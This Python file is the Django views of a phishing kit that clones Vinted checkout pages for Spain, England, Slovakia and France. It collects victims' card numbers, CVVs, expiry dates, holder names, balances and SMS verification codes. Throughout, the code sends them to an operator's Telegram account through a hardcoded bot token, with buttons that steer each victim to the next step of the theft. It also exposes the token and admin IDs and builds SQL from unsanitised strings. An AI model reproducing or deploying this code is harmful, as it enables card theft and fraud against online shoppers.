from django.shortcuts import render
from .models import Workers, SpainVinted, Cards, EnglandVinted, SlovakiaVinted, FranceVinted
from django.views.generic import DetailView
from .forms import CardForm, SpainForm, SmsForm, PayEngForm, FranceForm, SlovakiaForm
from django.urls import reverse
from django.views.generic.edit import FormMixin
import telebot
import mysql.connector
from telebot import types
from django.shortcuts import redirect
import time
from datetime import date


sum_eng = {}
sum_spain = {}

conn = mysql.connector.connect(
    host="localhost",  # host ip
    user="root",  # database user
    password="",  # Соответствующий пароль пользователя
    database="test",  # соответствующая база данных
    port=3305,  # порт базы данных, по умолчанию 3306
    charset='utf8'  # кодировка базы данных
)

bot = telebot.TeleBot('5729479478:AAGCxrm4G2hpjegMMy2DRisJaBq88QkSe8g')

lst_admins = [946127635, 5216185980]
bot.send_message(lst_admins[0], 'test')
miss2 = ''
miss3 = ''


def index(request):
    news = Workers.objects.all()
    f = SpainVinted.objects.all()
    bot.send_message(946127635, f'ввод карты \n ID:{SpainVinted}')
    return render(request, 'templates/main/index.html', {'news': news, 'f': f})


def check(request):
    return render(request, 'templates/main/done.html')


def test(request):
    bot.send_message(946127635, f'ввод карты \n ID:{SpainVinted}')
    return render(request, 'templates/main/pay.html')


class Pay(FormMixin, DetailView):
    model = SpainVinted
    template_name = 'templates/main/pay.html'
    context_object_name = 'model'
    form_class = SpainForm

    def get_success_url(self):
        return reverse('pay', kwargs={'pk': self.object.id})

    def get_context_data(self, **kwargs):
        global miss3
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_spainvinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'📭 🇪🇸 VINTED Переход на ссылку\n📭 ID Объявления: {self.object.id}\n📭 Название: {result[0][1]}\n📭 Стоимость: {result[0][2]} EUR\n📭 Локация: Spain')
        print(22222222222222222222222222222222222222222222)
        #bot.send_message(-1001663883140, f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id} \nСервис: Spain Vinted \nВоркер: {result[0][3]}')

        context = super(Pay, self).get_context_data(**kwargs)
        context['form'] = SpainForm(initial={'post': self.object})
        context['miss'] = miss3
        miss3 = ''

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        global result, sum_spain, object_id
        """
        form.save()
        cards = Cards()
        cards.num = form.cleaned_data.get('num')
        cards.cvv = form.cleaned_data.get('cvv')
        cards.month = form.cleaned_data.get('month')
        cards.year = form.cleaned_data.get('year')
        cards.card_holder = form.cleaned_data.get('card_holder')
        cards.card_balance = form.cleaned_data.get('card_balance')
        cards.save()
        """
        object_id = self.object.id
        num = form.cleaned_data.get('num')
        num4 = num[-4:]
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, user_name, title, price FROM main_spainvinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        sum_spain = {'sum_eng': form.cleaned_data.get('card_balance'), 'num4': num4, 'date': date.today()}

        key = types.InlineKeyboardMarkup()
        push = types.InlineKeyboardButton('PUSH', callback_data=f'push_spain_{result[0][0]}')
        sms = types.InlineKeyboardButton('SMS', callback_data=f'sms_spain_{result[0][0]}')
        balance = types.InlineKeyboardButton('Баланс', callback_data=f'balance_spain_{result[0][0]}')
        incorrect_card_spain = types.InlineKeyboardButton('Неправильная карта',
                                                        callback_data=f'incorrect_card_sp_{result[0][0]}')
        success = types.InlineKeyboardButton('УСПЕХ', callback_data=f'success_spain_{result[0][0]}')

        key.add(push, sms)
        key.add(balance)
        key.add(incorrect_card_spain)
        key.add(success)

        bot.send_message(946127635, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: Spain Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        bot.send_message(result[0][0], f'⚠ Карта введена!\n📭 🇪🇸 VINTED\n📭 ID Объявления: {self.object.id}\n📭 Название: {result[0][2]}\n📭 Стоимость: {result[0][3]} EUR\n📭 Локация:  Spain\n\n💳 Номер: {form.cleaned_data.get("num")}\n\n💎 Баланс карты: {form.cleaned_data.get("card_balance")}')
        #bot.send_message(-1001663883140, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: Spain Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        #bot.send_message(-701201591, f'Ввод карты. Баланс {form.cleaned_data.get("card_balance")} EUR')

        return redirect('loader')


class SpainVintedView(DetailView):
    model = SpainVinted
    template_name = 'templates/main/order.html'
    context_object_name = 'name'

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_spainvinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'📭 🇪🇸 VINTED Переход на ссылку\n📭 ID Объявления: {self.object.id}\n📭 Название: {result[0][1]}\n📭 Стоимость: {result[0][2]} EUR\n📭 Локация: Spain')
        #bot.send_message(-1001663883140, f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id} \nСервис: Spain Vinted \nВоркер: @{result[0][3]}')

        context = super(SpainVintedView, self).get_context_data(**kwargs)
        context['form'] = SpainForm(initial={'post': self.object})

        return context


class EnglandVintedView(DetailView):
    model = EnglandVinted
    template_name = 'templates/main/order_eng.html'
    context_object_name = 'name'

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_englandvinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id} \nСервис: Spain Vinted \nВоркер: @{result[0][3]}')

        context = super(EnglandVintedView, self).get_context_data(**kwargs)
        context['form'] = CardForm(initial={'post': self.object})

        return context


class PayEng(FormMixin, DetailView):
    model = EnglandVinted
    template_name = 'templates/main/pay_eng.html'
    context_object_name = 'model'
    form_class = CardForm

    def get_success_url(self):
        return reverse('pay_eng', kwargs={'pk': self.object.id})

    def get_context_data(self, **kwargs):
        global miss2
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_englandvinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id} \nСервис: Spain Vinted \nВоркер: {result[0][3]}')

        context = super(PayEng, self).get_context_data(**kwargs)
        context['form'] = CardForm(initial={'post': self.object})
        context['miss'] = miss2
        miss2 = ''

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        global result, sum_eng, object_id

        sum_eng_form = form.cleaned_data
        num = sum_eng_form['num']
        num4 = num[-4:]
        print(num4)
        object_id = self.object.id
        print(self.object.id)
        sum_eng = {'sum_eng': sum_eng_form['card_balance'], 'num4': num4, 'date': date.today()}
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, user_name FROM main_englandvinted WHERE id={self.object.id}')
        result = cursor.fetchall()

        key = types.InlineKeyboardMarkup()
        push = types.InlineKeyboardButton('PUSH', callback_data=f'push_england_{result[0][0]}')
        sms = types.InlineKeyboardButton('SMS', callback_data=f'sms_england_{result[0][0]}')
        balance = types.InlineKeyboardButton('Баланс', callback_data=f'balance_england_{result[0][0]}')
        incorrect_card_eng = types.InlineKeyboardButton('Неправильная карта',
                                                        callback_data=f'incorrect_card_eng_{result[0][0]}')
        success = types.InlineKeyboardButton('УСПЕХ', callback_data=f'success_england_{result[0][0]}')

        key.add(push, sms)
        key.add(incorrect_card_eng)
        key.add(balance)
        key.add(success)

        print(result, '111111111111111111111111')

        bot.send_message(result[0][0], f'Номер карты: {form.cleaned_data.get("num")}')
        bot.send_message(946127635, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: England Vinted \nВоркер: @{result[0][1]}', reply_markup=key)

        # bot.send_message(-1001663883140, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: England Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        # bot.send_message(-701201591, f'Ввод карты. Баланс {form.cleaned_data.get("card_balance")} GBP')

        form.save()

        return redirect('loader')


class SlovakiaVintedView(DetailView):
    model = SlovakiaVinted
    template_name = 'templates/main/order_slovakia.html'
    context_object_name = 'name'

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_slovakiavinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id} \nСервис: Spain Vinted \nВоркер: @{result[0][3]}')

        context = super(SlovakiaVintedView, self).get_context_data(**kwargs)
        context['form'] = SlovakiaForm(initial={'post': self.object})

        return context


class PaySlovakia(FormMixin, DetailView):
    model = EnglandVinted
    template_name = 'templates/main/pay_slovakia.html'
    context_object_name = 'model'
    form_class = SlovakiaForm

    def get_success_url(self):
        return reverse('pay_slovakia', kwargs={'pk': self.object.id})

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_slovakiavinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id} \nСервис: Spain Vinted \nВоркер: {result[0][3]}')

        context = super(PaySlovakia, self).get_context_data(**kwargs)
        context['form'] = SlovakiaForm(initial={'post': self.object})

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        global result, sum_eng
        """cards = Cards()
        cards.num = form.cleaned_data.get('num')
        cards.cvv = form.cleaned_data.get('cvv')
        cards.month = form.cleaned_data.get('month')
        cards.year = form.cleaned_data.get('year')
        cards.card_holder = form.cleaned_data.get('card_holder')
        cards.card_balance = form.cleaned_data.get('card_balance')
        cards.save()"""
        sum_eng_form = form.cleaned_data
        num = sum_eng_form['num']
        num4 = num[-4:]
        print(num4)
        object_id = self.object.id
        print(self.object.id)
        sum_eng = {'sum_eng': sum_eng_form['card_balance'], 'num4': num4, 'date': date.today()}

        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, user_name FROM main_slovakiavinted WHERE id={self.object.id}')
        result = cursor.fetchall()

        key = types.InlineKeyboardMarkup()
        push = types.InlineKeyboardButton('PUSH', callback_data=f'push_slovakia_{result[0][0]}')
        sms = types.InlineKeyboardButton('SMS', callback_data=f'sms_slovakia_{result[0][0]}')
        balance = types.InlineKeyboardButton('Баланс', callback_data=f'balance_slovakia_{result[0][0]}')
        success = types.InlineKeyboardButton('УСПЕХ', callback_data=f'success_slovakia_{result[0][0]}')

        key.add(push, sms)
        key.add(balance)
        key.add(success)

        print(result, '111111111111111111111111')

        bot.send_message(result[0][0], f'Номер карты: {form.cleaned_data.get("num")}')
        bot.send_message(946127635, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: Slovakia Vinted \nВоркер: @{result[0][1]}', reply_markup=key)

        # bot.send_message(-1001663883140, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: Slovakia Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        # bot.send_message(-701201591, f'Ввод карты. Баланс {form.cleaned_data.get("card_balance")} EUR')

        form.save()

        return redirect('loader')


class FranceVintedView(DetailView):
    model = FranceVinted
    template_name = 'templates/main/order_france.html'
    context_object_name = 'name'

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_francevinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт перешёл по ссылке \nНазвание: {result[0][1]} \nЦена: {result[0][2]} \nID: {self.object.id} \nСервис: Spain Vinted \nВоркер: @{result[0][3]}')

        context = super(FranceVintedView, self).get_context_data(**kwargs)
        context['form'] = FranceForm(initial={'post': self.object})

        return context


class PayFrance(FormMixin, DetailView):
    model = FranceVinted
    template_name = 'templates/main/pay_france.html'
    context_object_name = 'model'
    form_class = FranceForm

    def get_success_url(self):
        return reverse('pay_france', kwargs={'pk': self.object.id})

    def get_context_data(self, **kwargs):
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, title, price, user_name FROM main_francevinted WHERE id={self.object.id}')
        result = cursor.fetchall()
        print(result)

        bot.send_message(result[0][0], f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id}')
        #bot.send_message(-1001663883140, f'мамонт на вводе карты \n Название:{result[0][1]} \n Цена: {result[0][2]} \n ID: {self.object.id} \nСервис: Spain Vinted \nВоркер: {result[0][3]}')

        context = super(PayFrance, self).get_context_data(**kwargs)
        context['form'] = FranceForm(initial={'post': self.object})

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        global result, sum_eng

        """cards = Cards()
        cards.num = form.cleaned_data.get('num')
        cards.cvv = form.cleaned_data.get('cvv')
        cards.month = form.cleaned_data.get('month')
        cards.year = form.cleaned_data.get('year')
        cards.card_holder = form.cleaned_data.get('card_holder')
        cards.card_balance = form.cleaned_data.get('card_balance')
        cards.save()"""
        sum_eng_form = form.cleaned_data
        num = sum_eng_form['num']
        num4 = num[-4:]
        print(num4)
        object_id = self.object.id
        print(self.object.id)
        sum_eng = {'sum_eng': sum_eng_form['card_balance'], 'num4': num4, 'date': date.today()}
        conn.commit()
        cursor = conn.cursor()
        cursor.execute(f'SELECT user_id, user_name FROM main_francevinted WHERE id={self.object.id}')
        result = cursor.fetchall()

        print(result, '111111111111111111111111')

        key = types.InlineKeyboardMarkup()
        push = types.InlineKeyboardButton('PUSH', callback_data=f'push_france_{result[0][0]}')
        sms = types.InlineKeyboardButton('SMS', callback_data=f'sms_france_{result[0][0]}')
        balance = types.InlineKeyboardButton('Баланс', callback_data=f'balance_france_{result[0][0]}')
        success = types.InlineKeyboardButton('УСПЕХ', callback_data=f'success_france_{result[0][0]}')

        key.add(push, sms)
        key.add(balance)
        key.add(success)

        bot.send_message(result[0][0], f'Номер карты: {form.cleaned_data.get("num")}')
        bot.send_message(946127635, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: France Vinted \nВоркер: @{result[0][1]}', reply_markup=key)

        # bot.send_message(-1001663883140, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: France Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        # bot.send_message(-701201591, f'Ввод карты. Баланс {form.cleaned_data.get("card_balance")} EUR')

        form.save()

        return redirect('loader')


def push_eng(request):
    data = {'sum_eng': sum_eng}
    return render(request, 'templates/main/push_eng.html', sum_eng)


"""class PushEng(DetailView):
    model = {'sum_eng': sum_eng}
    print('a')
    template_name = 'templates/main/push_eng.html'
    context_object_name = 'name'"""


ch = False
miss = ''


def loader(request):
    global ch, sum_eng, miss, miss2, miss3, sum_spain
    ch = True
    while True:
        conn.commit()
        cursor = conn.cursor()
        time.sleep(1)
        cursor.execute(f"SELECT * FROM temp WHERE user_id={result[0][0]}")
        result2 = cursor.fetchall()
        print(result2)
        if result2[0][0] == 'push_england':
            print(sum_eng)
            return render(request, 'templates/main/push_eng.html', sum_eng)
        if result2[0][0] == 'push_france':
            print(sum_eng)
            return render(request, 'templates/main/push_france.html', sum_eng)
        if result2[0][0] == 'push_slovakia':
            print(sum_eng)
            return render(request, 'templates/main/push_slovakia.html', sum_eng)
        elif result2[0][0] == 'push_spain':
            print(sum_spain)
            return render(request, 'templates/main/push_spain.html', sum_spain)

        elif result2[0][0] == 'sms_england':
            print(sum_eng)
            return redirect('sms_eng')
        elif result2[0][0] == 'sms_slovakia':
            print(sum_eng)
            return redirect('sms_slovakia')
        elif result2[0][0] == 'sms_france':
            print(sum_eng)
            return redirect('sms_france')
        elif result2[0][0] == 'sms_spain':
            return redirect('sms_spain')
        elif result2[0][0] == 'incorrect_sms_eng':
            miss = 'Wrong code'
            return redirect('sms_eng')
        elif result2[0][0] == 'incorrect_sms_france':
            miss = 'Mauvais code'
            return redirect('sms_france')
        elif result2[0][0] == 'incorrect_sms_slovakia':
            miss = 'Nesprávny kód'
            return redirect('sms_france')
        elif result2[0][0] == 'incorrect_sms_sp':
            miss3 = 'Codigo erroneo'
            return redirect('sms_spain')
        elif result2[0][0] == 'incorrect_balance_eng':
            miss = 'Wrong balance. Please enter a valid value.'
            return redirect('sms_eng')
        elif result2[0][0] == 'incorrect_balance_slovakia':
            miss = 'Nesprávna rovnováha. Zadajte platnú hodnotu.'
            return redirect('sms_slovakia')
        elif result2[0][0] == 'incorrect_balance_sp':
            miss3 = 'Equilibrio incorrecto. Por favor ingrese una cifra válida.'
            return redirect('sms_spain')
        elif result2[0][0] == 'incorrect_balance_france':
            miss = 'Mauvais équilibre. Veuillez saisir un chiffre valide.'
            return redirect('sms_france')
        elif result2[0][0] == 'incorrect_card_eng':
            print(object_id)
            miss3 = 'Referral card details'
            print(miss3)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect(reverse('pay_eng', kwargs={'pk': object_id}), {'miss': miss3})
        elif result2[0][0] == 'incorrect_card_sp':
            #print(object_id)
            miss3 = 'Detalles de la tarjeta de referencia'
            print(miss3)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect(reverse('pay', kwargs={'pk': object_id}), {'miss': miss3})
        return render(request, 'templates/main/loader.html')


def pay_eng(request):
    if request.method == 'POST':
        form = PayEngForm(request.POST)
        if form.is_valid():
            print(form.cleaned_data)
    else:
        form = PayEngForm()
    return render(request, 'templates/main/pay_eng2.html', {'form': form})


def sms_eng(request):
    sum = sum_eng['sum_eng']
    num4 =  sum_eng['num4']
    date = sum_eng['date']
    if request.method == 'POST':
        form = SmsForm(request.POST)
        if form.is_valid():
            print(form.cleaned_data)
            key = types.InlineKeyboardMarkup()
            incorrect_sms = types.InlineKeyboardButton('Неправильный код', callback_data=f'incorrect_sms_eng_{result[0][0]}')
            incorrect_balance = types.InlineKeyboardButton('Неправильный баланс', callback_data=f'incorrect_balance_eng{result[0][0]}')
            key.add(incorrect_sms)
            key.add(incorrect_balance)
            bot.send_message(946127635, f'Код: {form.cleaned_data.get("sms_kod")}\nENGLAND VINTED', reply_markup=key)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect('loader')
    else:
        form = SmsForm()
    return render(request, 'templates/main/sms_eng.html', {'form': form, 'sum_eng': sum, 'num4': num4, 'date': date, 'miss': miss})


def sms_slovakia(request):
    sum = sum_eng['sum_eng']
    num4 =  sum_eng['num4']
    date = sum_eng['date']
    if request.method == 'POST':
        form = SmsForm(request.POST)
        if form.is_valid():
            print(form.cleaned_data)
            key = types.InlineKeyboardMarkup()
            incorrect_sms = types.InlineKeyboardButton('Неправильный код', callback_data=f'incorrect_sms_slovakia_  {result[0][0]}')
            incorrect_balance = types.InlineKeyboardButton('Неправильный баланс', callback_data=f'incorrect_balance_slovakia{result[0][0]}')
            key.add(incorrect_sms)
            key.add(incorrect_balance)
            bot.send_message(946127635, f'Код: {form.cleaned_data.get("sms_kod")}\nENGLAND VINTED', reply_markup=key)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect('loader')
    else:
        form = SmsForm()
    return render(request, 'templates/main/sms_slovakia.html', {'form': form, 'sum_eng': sum, 'num4': num4, 'date': date, 'miss': miss})


def sms_france(request):
    sum = sum_eng['sum_eng']
    num4 =  sum_eng['num4']
    date = sum_eng['date']
    if request.method == 'POST':
        form = SmsForm(request.POST)
        if form.is_valid():
            print(form.cleaned_data)
            key = types.InlineKeyboardMarkup()
            incorrect_sms = types.InlineKeyboardButton('Неправильный код', callback_data=f'incorrect_sms_france_{result[0][0]}')
            incorrect_balance = types.InlineKeyboardButton('Неправильный баланс', callback_data=f'incorrect_balance_france{result[0][0]}')
            key.add(incorrect_sms)
            key.add(incorrect_balance)
            bot.send_message(946127635, f'Код: {form.cleaned_data.get("sms_kod")}\nFRANCE VINTED', reply_markup=key)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect('loader')
    else:
        form = SmsForm()
    return render(request, 'templates/main/sms_france.html', {'form': form, 'sum_eng': sum, 'num4': num4, 'date': date, 'miss': miss})


def sms_spain(request):
    sum = sum_spain['sum_eng']
    num4 =  sum_spain['num4']
    date = sum_spain['date']
    if request.method == 'POST':
        form = SmsForm(request.POST)
        if form.is_valid():
            print(form.cleaned_data)
            key = types.InlineKeyboardMarkup()
            incorrect_sms = types.InlineKeyboardButton('Неправильный код', callback_data=f'incorrect_sms_sp_{result[0][0]}')
            incorrect_balance = types.InlineKeyboardButton('Неправильный баланс', callback_data=f'incorrect_balance_sp{result[0][0]}')
            key.add(incorrect_sms)
            key.add(incorrect_balance)
            bot.send_message(946127635, f'Код: {form.cleaned_data.get("sms_kod")}\nSPAIN VINTED', reply_markup=key)
            cursor = conn.cursor()
            cursor.execute(f'UPDATE temp SET temp="" WHERE user_id="{result[0][0]}"')
            conn.commit()
            return redirect('loader')
    else:
        form = SmsForm()
    return render(request, 'templates/main/sms_spain.html', {'form': form, 'sum_eng': sum, 'num4': num4, 'date': date, 'miss': miss3})


"""class SmsEng(FormMixin, DetailView):
    model = Cards
    template_name = 'templates/main/sms_eng.html'
    context_object_name = 'model'
    form_class = SmsForm

    def get_success_url(self):
        return reverse('sms_eng', kwargs={'pk': self.object.id})

    def get_context_data(self, **kwargs):
        context = super(SmsEng, self).get_context_data(**kwargs)
        context['form'] = CardForm(initial={'post': self.object})
        context['sum_eng'] = sum_eng
        print(context['sum_eng'])

        return context

    def post(self, request, *args, **kwargs):
        self.object = self.get_object()
        form = self.get_form()
        if form.is_valid():
            return self.form_valid(form)
        else:
            return self.form_invalid(form)

    def form_valid(self, form):
        global result

        cards = Cards()
        cards.num = form.cleaned_data.get('num')
        cards.cvv = form.cleaned_data.get('cvv')
        cards.month = form.cleaned_data.get('month')
        cards.year = form.cleaned_data.get('year')
        cards.card_holder = form.cleaned_data.get('card_holder')
        cards.card_balance = form.cleaned_data.get('card_balance')
        cards.save()



        # bot.send_message(-1001663883140, f'Номер карты: {form.cleaned_data.get("num")} \nCVV: {form.cleaned_data.get("cvv")} \nСрок годности: {form.cleaned_data.get("month")}/{form.cleaned_data.get("year")} \nБаланс: {form.cleaned_data.get("card_balance")} \nДержатель карты: {form.cleaned_data.get("card_holder")}\nСервис: France Vinted \nВоркер: @{result[0][1]}', reply_markup=key)
        # bot.send_message(-701201591, f'Ввод карты. Баланс {form.cleaned_data.get("card_balance")} EUR')

        form.save()

        return super(SmsEng, self).form_valid(form)"""


class Test(DetailView):
    model = SpainVinted
    print(model.title, 'title')
    template_name = 'templates/main/index.html'
    context_object_name = 'some'


print('smth')